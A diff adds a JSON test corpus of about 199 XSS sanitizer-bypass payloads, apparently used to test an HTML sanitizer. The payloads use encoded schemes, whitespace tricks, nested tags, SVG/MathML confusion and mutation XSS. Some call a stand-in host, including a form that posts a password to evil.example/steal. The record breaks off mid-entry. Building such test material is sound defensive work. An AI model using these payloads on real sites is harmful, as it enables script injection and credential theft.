@@ -1,0 +1,1567 @@
+[
+ {
+  "id": "R1-03-a",
+  "category": "attribute-separator",
+  "input": "<img src=\"x\"onerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-002",
+  "category": "attribute-separator",
+  "input": "<img src=x/onerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-003",
+  "category": "attribute-separator",
+  "input": "<img src=x onerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-004",
+  "category": "attribute-separator",
+  "input": "<img src=x\tonerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-005",
+  "category": "attribute-separator",
+  "input": "<img src=x\nonerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-006",
+  "category": "attribute-separator",
+  "input": "<img src=x\ronerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-007",
+  "category": "attribute-separator",
+  "input": "<img src=x\fonerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-008",
+  "category": "attribute-separator",
+  "input": "<img src=x\u000bonerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-009",
+  "category": "attribute-separator",
+  "input": "<img src=x\"onerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-010",
+  "category": "attribute-separator",
+  "input": "<img src=x'onerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-011",
+  "category": "attribute-separator",
+  "input": "<img src=x/ onerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-012",
+  "category": "attribute-separator",
+  "input": "<img src=x / onerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-013",
+  "category": "attribute-separator",
+  "input": "<img src=x\n/onerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-014",
+  "category": "attribute-separator",
+  "input": "<img src=x/\nonerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-015",
+  "category": "attribute-separator",
+  "input": "<img src=x`onerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-016",
+  "category": "attribute-separator",
+  "input": "<img src=x onerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-017",
+  "category": "attribute-separator",
+  "input": "<img src=x\u0000onerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-018",
+  "category": "attribute-separator",
+  "input": "<img src=\"x\"/onerror=\"alert(1)\">"
+ },
+ {
+  "id": "attribute-separator-019",
+  "category": "attribute-separator",
+  "input": "<img src=\"x\"\"onerror=\"alert(1)\">"
+ },
+ {
+  "id": "attribute-separator-020",
+  "category": "attribute-separator",
+  "input": "<img src=\"x\"'onerror=\"alert(1)\">"
+ },
+ {
+  "id": "attribute-separator-021",
+  "category": "attribute-separator",
+  "input": "<img src=\"x\"\tonerror=\"alert(1)\">"
+ },
+ {
+  "id": "attribute-separator-022",
+  "category": "attribute-separator",
+  "input": "<img/src=x/onerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-023",
+  "category": "attribute-separator",
+  "input": "<img src='x'onerror='alert(1)'>"
+ },
+ {
+  "id": "attribute-separator-024",
+  "category": "attribute-separator",
+  "input": "<a href=x onclick=alert(1)//>x</a>"
+ },
+ {
+  "id": "attribute-separator-025",
+  "category": "attribute-separator",
+  "input": "<p/onclick=alert(1)>x</p>"
+ },
+ {
+  "id": "attribute-separator-026",
+  "category": "attribute-separator",
+  "input": "<div onclick\n=\nalert(1)>x</div>"
+ },
+ {
+  "id": "attribute-separator-027",
+  "category": "attribute-separator",
+  "input": "<img src=x onerror=alert`1`>"
+ },
+ {
+  "id": "attribute-separator-028",
+  "category": "attribute-separator",
+  "input": "<img src=x ONERROR=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-029",
+  "category": "attribute-separator",
+  "input": "<img src=x oNeRrOr=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-030",
+  "category": "attribute-separator",
+  "input": "<img src=x onerror = alert(1)>"
+ },
+ {
+  "id": "attribute-separator-031",
+  "category": "attribute-separator",
+  "input": "<p title=\">\" onclick=alert(1)>x</p>"
+ },
+ {
+  "id": "attribute-separator-032",
+  "category": "attribute-separator",
+  "input": "<p title='\"' onclick=alert(1)>x</p>"
+ },
+ {
+  "id": "attribute-separator-033",
+  "category": "attribute-separator",
+  "input": "<img src=x:x onerror=alert(1)>"
+ },
+ {
+  "id": "attribute-separator-034",
+  "category": "attribute-separator",
+  "input": "<span style=x onmouseover=alert(1)>x</span>"
+ },
+ {
+  "id": "R1-03-b",
+  "category": "entity-scheme",
+  "input": "<a href=\"jav&#x61;script:alert(1)\">x</a>"
+ },
+ {
+  "id": "entity-scheme-036",
+  "category": "entity-scheme",
+  "input": "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">x</a>"
+ },
+ {
+  "id": "entity-scheme-037",
+  "category": "entity-scheme",
+  "input": "<img src=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">"
+ },
+ {
+  "id": "entity-scheme-038",
+  "category": "entity-scheme",
+  "input": "<a href=\"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\">x</a>"
+ },
+ {
+  "id": "entity-scheme-039",
+  "category": "entity-scheme",
+  "input": "<img src=\"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\">"
+ },
+ {
+  "id": "entity-scheme-040",
+  "category": "entity-scheme",
+  "input": "<a href=\"&#0000106;&#0000097;&#0000118;&#0000097;&#0000115;&#0000099;&#0000114;&#0000105;&#0000112;&#0000116;&#0000058;&#0000097;&#0000108;&#0000101;&#0000114;&#0000116;&#0000040;&#0000049;&#0000041;\">x</a>"
+ },
+ {
+  "id": "entity-scheme-041",
+  "category": "entity-scheme",
+  "input": "<img src=\"&#0000106;&#0000097;&#0000118;&#0000097;&#0000115;&#0000099;&#0000114;&#0000105;&#0000112;&#0000116;&#0000058;&#0000097;&#0000108;&#0000101;&#0000114;&#0000116;&#0000040;&#0000049;&#0000041;\">"
+ },
+ {
+  "id": "entity-scheme-042",
+  "category": "entity-scheme",
+  "input": "<a href=\"&#x00006a;&#x000061;&#x000076;&#x000061;&#x000073;&#x000063;&#x000072;&#x000069;&#x000070;&#x000074;&#x00003a;&#x000061;&#x00006c;&#x000065;&#x000072;&#x000074;&#x000028;&#x000031;&#x000029;\">x</a>"
+ },
+ {
+  "id": "entity-scheme-043",
+  "category": "entity-scheme",
+  "input": "<img src=\"&#x00006a;&#x000061;&#x000076;&#x000061;&#x000073;&#x000063;&#x000072;&#x000069;&#x000070;&#x000074;&#x00003a;&#x000061;&#x00006c;&#x000065;&#x000072;&#x000074;&#x000028;&#x000031;&#x000029;\">"
+ },
+ {
+  "id": "entity-scheme-044",
+  "category": "entity-scheme",
+  "input": "<a href=\"j&#97;v&#97;s&#99;r&#105;p&#116;:&#97;l&#101;r&#116;(&#49;)\">x</a>"
+ },
+ {
+  "id": "entity-scheme-045",
+  "category": "entity-scheme",
+  "input": "<img src=\"j&#97;v&#97;s&#99;r&#105;p&#116;:&#97;l&#101;r&#116;(&#49;)\">"
+ },
+ {
+  "id": "entity-scheme-046",
+  "category": "entity-scheme",
+  "input": "<a href=\"&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#41\">x</a>"
+ },
+ {
+  "id": "entity-scheme-047",
+  "category": "entity-scheme",
+  "input": "<img src=\"&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#49&#41\">"
+ },
+ {
+  "id": "entity-scheme-048",
+  "category": "entity-scheme",
+  "input": "<a href=\"javascript&colon;alert(1)\">x</a>"
+ },
+ {
+  "id": "entity-scheme-049",
+  "category": "entity-scheme",
+  "input": "<a href=\"javascript&#58;alert(1)\">x</a>"
+ },
+ {
+  "id": "entity-scheme-050",
+  "category": "entity-scheme",
+  "input": "<a href=\"javascript&#x3a;alert(1)\">x</a>"
+ },
+ {
+  "id": "entity-scheme-051",
+  "category": "entity-scheme",
+  "input": "<a href=\"javascript&Tab;:alert(1)\">x</a>"
+ },
+ {
+  "id": "entity-scheme-052",
+  "category": "entity-scheme",
+  "input": "<a href=\"java&Tab;script:alert(1)\">x</a>"
+ },
+ {
+  "id": "entity-scheme-053",
+  "category": "entity-scheme",
+  "input": "<a href=\"java&NewLine;script:alert(1)\">x</a>"
+ },
+ {
+  "id": "entity-scheme-054",
+  "category": "entity-scheme",
+  "input": "<a href=\"&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29\">x</a>"
+ },
+ {
+  "id": "entity-scheme-055",
+  "category": "entity-scheme",
+  "input": "<a href=\"vbscript:msgbox(1)\">x</a>"
+ },
+ {
+  "id": "entity-scheme-056",
+  "category": "entity-scheme",
+  "input": "<a href=\"vb&#115;cript:msgbox(1)\">x</a>"
+ },
+ {
+  "id": "entity-scheme-057",
+  "category": "entity-scheme",
+  "input": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>"
+ },
+ {
+  "id": "entity-scheme-058",
+  "category": "entity-scheme",
+  "input": "<a href=\"d&#97;ta:text/html,<script>alert(1)</script>\">x</a>"
+ },
+ {
+  "id": "entity-scheme-059",
+  "category": "entity-scheme",
+  "input": "<a href=\"&#106;avascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "entity-scheme-060",
+  "category": "entity-scheme",
+  "input": "<a href=\"JAVASCRIPT:alert(1)\">x</a>"
+ },
+ {
+  "id": "entity-scheme-061",
+  "category": "entity-scheme",
+  "input": "<a href=\"JaVaScRiPt:alert(1)\">x</a>"
+ },
+ {
+  "id": "entity-scheme-062",
+  "category": "entity-scheme",
+  "input": "<iframe src=\"jav&#x61;script:alert(1)\"></iframe>"
+ },
+ {
+  "id": "entity-scheme-063",
+  "category": "entity-scheme",
+  "input": "<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">"
+ },
+ {
+  "id": "entity-scheme-064",
+  "category": "entity-scheme",
+  "input": "<img src=\"data:image/svg+xml,&lt;svg onload=alert(1)&gt;\">"
+ },
+ {
+  "id": "entity-scheme-065",
+  "category": "entity-scheme",
+  "input": "<img src=\"&#100;ata:image/svg+xml;base64,AAAA\">"
+ },
+ {
+  "id": "R1-03-c",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"java\tscript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-067",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"\tjavascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-068",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"java\nscript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-069",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"\njavascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-070",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"java\rscript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-071",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"\rjavascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-072",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"java\fscript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-073",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"\fjavascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-074",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"java\u000bscript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-075",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"\u000bjavascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-076",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"java\u0000script:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-077",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"\u0000javascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-078",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"java script:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-079",
+  "category": "whitespace-scheme",
+  "input": "<a href=\" javascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-080",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"java script:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-081",
+  "category": "whitespace-scheme",
+  "input": "<a href=\" javascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-082",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"java script:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-083",
+  "category": "whitespace-scheme",
+  "input": "<a href=\" javascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-084",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"java script:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-085",
+  "category": "whitespace-scheme",
+  "input": "<a href=\" javascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-086",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"java​script:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-087",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"​javascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-088",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"java﻿script:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-089",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"﻿javascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-090",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"\n\n\njavascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-091",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"javascript\n:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-092",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"jav\tas\ncr\ri\u000bpt:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-093",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"\u0001javascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-094",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"\u001fjavascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-095",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"data\n:text/html,<script>alert(1)</script>\">x</a>"
+ },
+ {
+  "id": "whitespace-scheme-096",
+  "category": "whitespace-scheme",
+  "input": "<img src=\"da\tta:image/svg+xml;base64,AAAA\">"
+ },
+ {
+  "id": "whitespace-scheme-097",
+  "category": "whitespace-scheme",
+  "input": "<img src=\" data:text/html;base64,AAAA\">"
+ },
+ {
+  "id": "whitespace-scheme-098",
+  "category": "whitespace-scheme",
+  "input": "<a href=\"vb\tscript:msgbox(1)\">x</a>"
+ },
+ {
+  "id": "R1-03-d",
+  "category": "nested-reconstruction",
+  "input": "<scr<script>ipt>alert(1)</scr</script>ipt>"
+ },
+ {
+  "id": "nested-reconstruction-100",
+  "category": "nested-reconstruction",
+  "input": "<scr<script>ipt>alert(1)</scr<script>ipt>"
+ },
+ {
+  "id": "nested-reconstruction-101",
+  "category": "nested-reconstruction",
+  "input": "<<script>script>alert(1)<</script>/script>"
+ },
+ {
+  "id": "nested-reconstruction-102",
+  "category": "nested-reconstruction",
+  "input": "<scr<script></script>ipt>alert(1)</script>"
+ },
+ {
+  "id": "nested-reconstruction-103",
+  "category": "nested-reconstruction",
+  "input": "<ifr<iframe>ame src=javascript:alert(1)>"
+ },
+ {
+  "id": "nested-reconstruction-104",
+  "category": "nested-reconstruction",
+  "input": "<im<img>g src=x onerror=alert(1)>"
+ },
+ {
+  "id": "nested-reconstruction-105",
+  "category": "nested-reconstruction",
+  "input": "<img src=x on<script></script>error=alert(1)>"
+ },
+ {
+  "id": "nested-reconstruction-106",
+  "category": "nested-reconstruction",
+  "input": "<a href=\"java<script></script>script:alert(1)\">x</a>"
+ },
+ {
+  "id": "nested-reconstruction-107",
+  "category": "nested-reconstruction",
+  "input": "<a hr<b>ef=\"javascript:alert(1)\">x</a>"
+ },
+ {
+  "id": "nested-reconstruction-108",
+  "category": "nested-reconstruction",
+  "input": "<<img src=x onerror=alert(1)>"
+ },
+ {
+  "id": "nested-reconstruction-109",
+  "category": "nested-reconstruction",
+  "input": "<<<script>>script>alert(1)</script>"
+ },
+ {
+  "id": "nested-reconstruction-110",
+  "category": "nested-reconstruction",
+  "input": "<scr\u0000ipt>alert(1)</scr\u0000ipt>"
+ },
+ {
+  "id": "nested-reconstruction-111",
+  "category": "nested-reconstruction",
+  "input": "<scr<!-- -->ipt>alert(1)</script>"
+ },
+ {
+  "id": "nested-reconstruction-112",
+  "category": "nested-reconstruction",
+  "input": "<scr<style></style>ipt>alert(1)</script>"
+ },
+ {
+  "id": "nested-reconstruction-113",
+  "category": "nested-reconstruction",
+  "input": "<svg<svg>/onload=alert(1)>"
+ },
+ {
+  "id": "nested-reconstruction-114",
+  "category": "nested-reconstruction",
+  "input": "<p<p>onclick=alert(1)>x</p>"
+ },
+ {
+  "id": "nested-reconstruction-115",
+  "category": "nested-reconstruction",
+  "input": "<s<s>cript>alert(1)</s</s>cript>"
+ },
+ {
+  "id": "nested-reconstruction-116",
+  "category": "nested-reconstruction",
+  "input": "<div><div><scr<script>ipt>alert(1)</scr</script>ipt></div></div>"
+ },
+ {
+  "id": "nested-reconstruction-117",
+  "category": "nested-reconstruction",
+  "input": "<script<script>>alert(1)</script</script>>"
+ },
+ {
+  "id": "nested-reconstruction-118",
+  "category": "nested-reconstruction",
+  "input": "<ONERROR=alert(1)<img src=x>"
+ },
+ {
+  "id": "nested-reconstruction-119",
+  "category": "nested-reconstruction",
+  "input": "<scr%00ipt>alert(1)</scr%00ipt>"
+ },
+ {
+  "id": "nested-reconstruction-120",
+  "category": "nested-reconstruction",
+  "input": "<scr\tipt>alert(1)</scr\tipt>"
+ },
+ {
+  "id": "nested-reconstruction-121",
+  "category": "nested-reconstruction",
+  "input": "<scr<b></b>ipt>alert(1)</scr<b></b>ipt>"
+ },
+ {
+  "id": "nested-reconstruction-122",
+  "category": "nested-reconstruction",
+  "input": "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>"
+ },
+ {
+  "id": "nested-reconstruction-123",
+  "category": "nested-reconstruction",
+  "input": "<SCRIPT SRC=http://evil.example/x.js?<B>"
+ },
+ {
+  "id": "nested-reconstruction-124",
+  "category": "nested-reconstruction",
+  "input": "<scr<img src=x>ipt>alert(1)</script>"
+ },
+ {
+  "id": "namespace-confusion-125",
+  "category": "namespace-confusion",
+  "input": "<svg><style><img src=x onerror=alert(1)></style></svg>"
+ },
+ {
+  "id": "namespace-confusion-126",
+  "category": "namespace-confusion",
+  "input": "<svg><script>alert(1)</script></svg>"
+ },
+ {
+  "id": "namespace-confusion-127",
+  "category": "namespace-confusion",
+  "input": "<svg onload=alert(1)>"
+ },
+ {
+  "id": "namespace-confusion-128",
+  "category": "namespace-confusion",
+  "input": "<svg><a xlink:href=\"javascript:alert(1)\"><text>x</text></a></svg>"
+ },
+ {
+  "id": "namespace-confusion-129",
+  "category": "namespace-confusion",
+  "input": "<svg><a href=\"javascript:alert(1)\"><text>x</text></a></svg>"
+ },
+ {
+  "id": "namespace-confusion-130",
+  "category": "namespace-confusion",
+  "input": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
+ },
+ {
+  "id": "namespace-confusion-131",
+  "category": "namespace-confusion",
+  "input": "<svg><set attributeName=onmouseover to=alert(1)>"
+ },
+ {
+  "id": "namespace-confusion-132",
+  "category": "namespace-confusion",
+  "input": "<svg><use xlink:href=\"data:image/svg+xml;base64,AAAA#x\"/></svg>"
+ },
+ {
+  "id": "namespace-confusion-133",
+  "category": "namespace-confusion",
+  "input": "<svg><foreignObject><iframe srcdoc=\"<script>alert(1)</script>\"></iframe></foreignObject></svg>"
+ },
+ {
+  "id": "namespace-confusion-134",
+  "category": "namespace-confusion",
+  "input": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>"
+ },
+ {
+  "id": "namespace-confusion-135",
+  "category": "namespace-confusion",
+  "input": "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">"
+ },
+ {
+  "id": "namespace-confusion-136",
+  "category": "namespace-confusion",
+  "input": "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=1 onerror=alert(1)&gt;\">"
+ },
+ {
+  "id": "namespace-confusion-137",
+  "category": "namespace-confusion",
+  "input": "<math><mi xlink:href=\"javascript:alert(1)\">x</mi></math>"
+ },
+ {
+  "id": "namespace-confusion-138",
+  "category": "namespace-confusion",
+  "input": "<math href=\"javascript:alert(1)\">x</math>"
+ },
+ {
+  "id": "namespace-confusion-139",
+  "category": "namespace-confusion",
+  "input": "<math><maction actiontype=\"statusline#http://evil.example\" xlink:href=\"javascript:alert(1)\">x</maction></math>"
+ },
+ {
+  "id": "namespace-confusion-140",
+  "category": "namespace-confusion",
+  "input": "<math><annotation-xml encoding=\"text/html\"><script>alert(1)</script></annotation-xml></math>"
+ },
+ {
+  "id": "namespace-confusion-141",
+  "category": "namespace-confusion",
+  "input": "<math><mtext><style><img src=x onerror=alert(1)></style></mtext></math>"
+ },
+ {
+  "id": "namespace-confusion-142",
+  "category": "namespace-confusion",
+  "input": "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>"
+ },
+ {
+  "id": "namespace-confusion-143",
+  "category": "namespace-confusion",
+  "input": "<svg><title><![CDATA[</title><script>alert(1)</script>]]></title></svg>"
+ },
+ {
+  "id": "namespace-confusion-144",
+  "category": "namespace-confusion",
+  "input": "<svg><p><style><g title=\"</style><img src onerror=alert(1)>\">"
+ },
+ {
+  "id": "namespace-confusion-145",
+  "category": "namespace-confusion",
+  "input": "<svg xmlns=\"http://www.w3.org/2000/svg\"><image href=\"x\" onerror=\"alert(1)\"/></svg>"
+ },
+ {
+  "id": "namespace-confusion-146",
+  "category": "namespace-confusion",
+  "input": "<svg><discard onbegin=alert(1)>"
+ },
+ {
+  "id": "namespace-confusion-147",
+  "category": "namespace-confusion",
+  "input": "<svg><image xlink:href=\"x\" onload=alert(1)>"
+ },
+ {
+  "id": "namespace-confusion-148",
+  "category": "namespace-confusion",
+  "input": "<svg><script href=\"data:text/javascript,alert(1)\"/></svg>"
+ },
+ {
+  "id": "namespace-confusion-149",
+  "category": "namespace-confusion",
+  "input": "<svg><a><rect width=100 height=100 /><animate attributeName=href values=javascript:alert(1) /></a></svg>"
+ },
+ {
+  "id": "mxss-150",
+  "category": "mxss",
+  "input": "<template><script>alert(1)</script></template>"
+ },
+ {
+  "id": "mxss-151",
+  "category": "mxss",
+  "input": "<template><img src=x onerror=alert(1)></template>"
+ },
+ {
+  "id": "mxss-152",
+  "category": "mxss",
+  "input": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+ },
+ {
+  "id": "mxss-153",
+  "category": "mxss",
+  "input": "<noscript><style></noscript><img src=x onerror=alert(1)>"
+ },
+ {
+  "id": "mxss-154",
+  "category": "mxss",
+  "input": "<textarea><img src=x onerror=alert(1)></textarea>"
+ },
+ {
+  "id": "mxss-155",
+  "category": "mxss",
+  "input": "<textarea></textarea><img src=x onerror=alert(1)>"
+ },
+ {
+  "id": "mxss-156",
+  "category": "mxss",
+  "input": "<title><img src=x onerror=alert(1)></title>"
+ },
+ {
+  "id": "mxss-157",
+  "category": "mxss",
+  "input": "<title></title><img src=x onerror=alert(1)>"
+ },
+ {
+  "id": "mxss-158",
+  "category": "mxss",
+  "input": "<xmp><img src=x onerror=alert(1)></xmp>"
+ },
+ {
+  "id": "mxss-159",
+  "category": "mxss",
+  "input": "<xmp></xmp><img src=x onerror=alert(1)>"
+ },
+ {
+  "id": "mxss-160",
+  "category": "mxss",
+  "input": "<style><img src=x onerror=alert(1)></style>"
+ },
+ {
+  "id": "mxss-161",
+  "category": "mxss",
+  "input": "<style>@import \"javascript:alert(1)\";</style>"
+ },
+ {
+  "id": "mxss-162",
+  "category": "mxss",
+  "input": "<style></style><img src=x onerror=alert(1)>"
+ },
+ {
+  "id": "mxss-163",
+  "category": "mxss",
+  "input": "<style><!--</style><img src=x onerror=alert(1)>-->"
+ },
+ {
+  "id": "mxss-164",
+  "category": "mxss",
+  "input": "<script><!--<script></script><img src=x onerror=alert(1)>"
+ },
+ {
+  "id": "mxss-165",
+  "category": "mxss",
+  "input": "<noembed><img src=x onerror=alert(1)></noembed>"
+ },
+ {
+  "id": "mxss-166",
+  "category": "mxss",
+  "input": "<noframes><img src=x onerror=alert(1)></noframes>"
+ },
+ {
+  "id": "mxss-167",
+  "category": "mxss",
+  "input": "<select><option><img src=x onerror=alert(1)></option></select>"
+ },
+ {
+  "id": "mxss-168",
+  "category": "mxss",
+  "input": "<select><style><img src=x onerror=alert(1)></style></select>"
+ },
+ {
+  "id": "mxss-169",
+  "category": "mxss",
+  "input": "<option><img src=x onerror=alert(1)></option>"
+ },
+ {
+  "id": "mxss-170",
+  "category": "mxss",
+  "input": "<p><svg></p><style><a title=\"</style><img src onerror=alert(1)>\">"
+ },
+ {
+  "id": "mxss-171",
+  "category": "mxss",
+  "input": "<a title=\"<img src=x onerror=alert(1)>\">x</a>"
+ },
+ {
+  "id": "mxss-172",
+  "category": "mxss",
+  "input": "<p title=\"&lt;img src=x onerror=alert(1)&gt;\">x</p>"
+ },
+ {
+  "id": "mxss-173",
+  "category": "mxss",
+  "input": "<p title=\"</p><img src=x onerror=alert(1)>\">x</p>"
+ },
+ {
+  "id": "mxss-174",
+  "category": "mxss",
+  "input": "<listing><img src=x onerror=alert(1)></listing>"
+ },
+ {
+  "id": "mxss-175",
+  "category": "mxss",
+  "input": "<plaintext><img src=x onerror=alert(1)>"
+ },
+ {
+  "id": "mxss-176",
+  "category": "mxss",
+  "input": "<iframe><img src=x onerror=alert(1)></iframe>"
+ },
+ {
+  "id": "mxss-177",
+  "category": "mxss",
+  "input": "<object><param name=x value=\"<img src=x onerror=alert(1)>\"></object>"
+ },
+ {
+  "id": "mxss-178",
+  "category": "mxss",
+  "input": "<!--<img src=\"--><img src=x onerror=alert(1)//\">"
+ },
+ {
+  "id": "mxss-179",
+  "category": "mxss",
+  "input": "<![CDATA[><img src=x onerror=alert(1)>]]>"
+ },
+ {
+  "id": "mxss-180",
+  "category": "mxss",
+  "input": "<?php echo \"<script>alert(1)</script>\"; ?>"
+ },
+ {
+  "id": "mxss-181",
+  "category": "mxss",
+  "input": "<!DOCTYPE html><img src=x onerror=alert(1)>"
+ },
+ {
+  "id": "frame-and-form-182",
+  "category": "frame-and-form",
+  "input": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"
+ },
+ {
+  "id": "frame-and-form-183",
+  "category": "frame-and-form",
+  "input": "<iframe src=\"https://evil.example/\"></iframe>"
+ },
+ {
+  "id": "frame-and-form-184",
+  "category": "frame-and-form",
+  "input": "<iframe src=\"javascript:alert(1)\"></iframe>"
+ },
+ {
+  "id": "frame-and-form-185",
+  "category": "frame-and-form",
+  "input": "<p srcdoc=\"<script>alert(1)</script>\">x</p>"
+ },
+ {
+  "id": "frame-and-form-186",
+  "category": "frame-and-form",
+  "input": "<form action=\"https://evil.example/steal\"><input name=pw><button>go</button></form>"
+ },
+ {
+  "id": "frame-and-form-187",
+  "category": "frame-and-form",
+  "input": "<form action=\"javascript:alert(1)\"><button>go</button></form>"
+ },
+ {
+  "id": "frame-and-form-188",
+  "category": "frame-and-form",
+  "input": "<form><button formaction=\"javascript:alert(1)\">go</button></form>"
+ },
+ {
+  "id": "frame-and-form-189",
+  "category": "frame-and-form",
+  "input": "<button formaction=\"https://evil.example/\">go</button>"
+ },
+ {
+  "id": "frame-and-form-190",
+  "category": "frame-and-form",
+  "input": "<input type=image src=x onerror=alert(1)>"
+ },
+ {
+  "id": "frame-and-form-191",
+  "category": "frame-and-form",
+  "input": "<input autofocus onfocus=alert(1)>"
+ },
+ {
+  "id": "frame-and-form-192",
+  "category": "frame-and-form",
+  "input": "<object data=\"javascript:alert(1)\"></object>"
+ },
+ {
+  "id": "frame-and-form-193",
+  "category": "frame-and-form",
+  "input": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>"
+ },
+ {
+  "id": "frame-and-form-194",
+  "category": "frame-and-form",
+  "input": "<embed src=\"javascript:alert(1)\">"
+ },
+ {
+  "id": "frame-and-form-195",
+  "category": "frame-and-form",
+  "input": "<embed src=\"data:image/svg+xml;base64,AAAA\">"
+ },
+ {
+  "id": "frame-and-form-196",
+  "category": "frame-and-form",
+  "input": "<applet code=\"x\" archive=\"https://evil.example/x.jar\"></applet>"
+ },
+ {
+  "id": "frame-and-form-197",
+  "category": "frame-and-form",
+  "input": "<base href=\"https://evil.example/\">"
+ },
+ {
+  "id": "frame-and-form-198",
+  "category": "frame-and-form",
+  "input": "<base href=\"javascript:alert(1)//\">"
+ },
+ {
+  "id": "frame-and-form-199",
+  "category": "frame-and-form",
